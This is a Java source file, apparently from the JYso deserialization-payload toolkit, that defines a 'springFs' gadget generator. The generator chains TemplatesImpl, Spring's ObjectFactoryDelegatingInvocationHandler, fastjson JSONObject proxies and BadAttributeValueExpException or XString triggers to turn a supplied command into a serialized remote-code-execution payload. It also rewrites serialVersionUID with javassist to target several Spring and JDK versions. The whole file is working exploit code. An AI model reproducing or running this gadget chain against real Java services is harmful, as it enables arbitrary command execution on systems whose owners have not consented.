package com.qi4l.JYso.gadgets;


import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.NotFoundException;
import org.apache.logging.log4j.core.jackson.JsonConstants;
import org.springframework.beans.factory.ObjectFactory;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Objects;

import static com.qi4l.JYso.gadgets.utils.Utils.makeMap;

@SuppressWarnings({"rawtypes", "unchecked","unused"})
public class springFs implements ObjectPayload<Object>, Serializable {
    public static ClassPool pool = ClassPool.getDefault();
    // jdk17下使用badAttributeValueExpException,jdk8以上使用xString可打高版本JDK(jdk17)
    public String toString = "badAttributeValueExpException";
    // 低版本Spring-beans <5.3 -8835275493235412717
    // 高版本Spring-beans >=5.3 -1515767093960859525"
    public String serialVersionUID = "-1515767093960859525";

    @Override
    public Object getObject(String command) throws Exception {

        Object obj = Gadgets.createTemplatesImpl(command);

        Object inv;
        if (Objects.equals(this.serialVersionUID, "-1515767093960859525")) {

            CtClass ctClass;
            try {
                ctClass = pool.get("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
            } catch (NotFoundException e) {
                ctClass = pool.makeClass("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
            }


            if (ctClass.isFrozen()) {
                ctClass.defrost();
            }
            try {
                CtField field = ctClass.getDeclaredField("serialVersionUID");
                ctClass.removeField(field);
            } catch (NotFoundException ignored) {
            }
            ctClass.addField(CtField.make("private static final long serialVersionUID = " + serialVersionUID + "L;", ctClass));
            Class<?> aClass = ctClass.toClass(new URLClassLoader(new URL[0]), null);
            inv = Reflections.createWithoutConstructor(aClass);
            ctClass.defrost();
        } else {
            inv = Reflections.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        }
        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("object", obj);
        JSONObject jsonObject = new JSONObject(hashMap);
        Object o2 = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{ObjectFactory.class}, jsonObject);
        Reflections.setFieldValue(inv, "objectFactory", o2);
        Object o = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, (InvocationHandler) inv);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);
        if (this.toString.equals("xString")) {
            Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
            Object xString = Reflections.createWithoutConstructor(aClass1);
            Reflections.setFieldValue(xString, "m_obj", new char[0]);
            HashMap hashMap1 = new HashMap();
            HashMap hashMap2 = new HashMap();
            hashMap1.put("zZ", xString);
            hashMap1.put("yy", jsonArray);
            hashMap2.put("yy", xString);
            hashMap2.put("zZ", jsonArray);
            Object map = makeMap(hashMap1, hashMap2);
            ArrayList<Object> arrayList = new ArrayList<>();
            arrayList.add(obj);
            arrayList.add(o);
            arrayList.add(map);
            return arrayList;
        }
        Object badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
        Reflections.setFieldValue(badAttributeValueExpException, "stackTrace", new StackTraceElement[0]);
        Reflections.setFieldValue(badAttributeValueExpException, "suppressedExceptions", null);
        Reflections.setFieldValue(badAttributeValueExpException, JsonConstants.ELT_CAUSE, null);
        ArrayList<Object> arrayList2 = new ArrayList<>();
        arrayList2.add(obj);
        arrayList2.add(badAttributeValueExpException);
        return arrayList2;
    }
}
